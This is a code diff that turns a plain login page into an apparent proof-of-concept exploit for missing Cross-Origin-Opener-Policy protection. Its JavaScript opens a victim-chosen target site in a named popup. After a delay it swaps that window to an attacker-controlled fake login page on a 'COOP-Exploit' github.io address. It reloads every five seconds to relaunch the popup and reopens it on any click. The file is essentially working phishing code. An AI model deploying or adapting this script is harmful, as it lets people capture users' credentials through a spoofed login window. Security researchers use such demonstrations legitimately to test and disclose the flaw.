@@ -3,45 +3,91 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login</title>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
+    <title>Redirecting...</title>
     <style>
         body {
-            background: #eee !important;
+            background-color: #f4f7f9;
+            width: 100%;
+            height: 100vh;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            font-family: 'Arial', sans-serif;
         }
-        .wrapper {
-            margin-top: 80px;
-            margin-bottom: 80px;
+        #message-container {
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 80%;
         }
-        .form-signin {
-            max-width: 380px;
-            padding: 15px 35px 45px;
-            margin: 0 auto;
-            background-color: #fff;
-            border: 1px solid rgba(0, 0, 0, 0.1);
-            border-radius: 8px;
-            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        #message {
+            color: #333;
+            font-size: 18px;
+            line-height: 1.5;
         }
-        .form-signin .form-control {
-            font-size: 16px;
-            padding: 10px;
-            box-sizing: border-box;
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
+    <script type="text/javascript">
+        function tParam(qParam) {
+            const frmURL = window.location.search.substring(1);
+            const varURL = frmURL.split('&');
+            for (let i = 0; i < varURL.length; i++) {
+                const vParam = varURL[i].split('=');
+                if (vParam[0] === qParam) {
+                    return decodeURIComponent(vParam[1]);
+                }
+            }
+            window.location.href = "https://sp3ttr0.github.io/COOP-Exploit/";
+        }
+
+        function init() {
+            console.log("Redirecting to attacker's controlled site");
+            foo.location.href = "https://sp3ttr0.github.io/COOP-Exploit/login.html";
+        }
+
+        function launch() {
+            const target = tParam("target");
+            foo = window.open(target, "foo", "");
+            console.log("Target site opened successfully");
+            setTimeout(init, 6000);
+        }
+
+        function setup() {
+            const target = tParam("target");
+            document.body.addEventListener('click', launch);
+            const message = document.getElementById('message');
+            message.innerText = `Redirecting to ${target}... If the site did not automatically redirect to ${target}, click anywhere in the white background.`;
+            launch();
+        }
+
+        window.onload = function () {
+            setup();
+            setTimeout(() => {
+                location.reload();
+            }, 5000);
+        };
+    </script>
 </head>
 <body>
-    <div class="wrapper">
-        <form class="form-signin" action="/login" method="POST">       
-            <h2 class="form-signin-heading text-center">Please Login</h2>
-            <input type="email" class="form-control mb-3" name="username" placeholder="Email Address" required autofocus>
-            <input type="password" class="form-control mb-3" name="password" placeholder="Password" required>      
-            <div class="form-check mb-3">
-                <input class="form-check-input" type="checkbox" value="remember-me" id="rememberMe" name="rememberMe">
-                <label class="form-check-label" for="rememberMe"> Remember me </label>
-            </div>
-            <button class="btn btn-lg btn-primary w-100" type="submit">Login</button>   
-        </form>
+    <div id="message-container">
+        <div class="loader"></div>
+        <div id="message">Redirecting... Please wait.</div>
     </div>
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 </html>
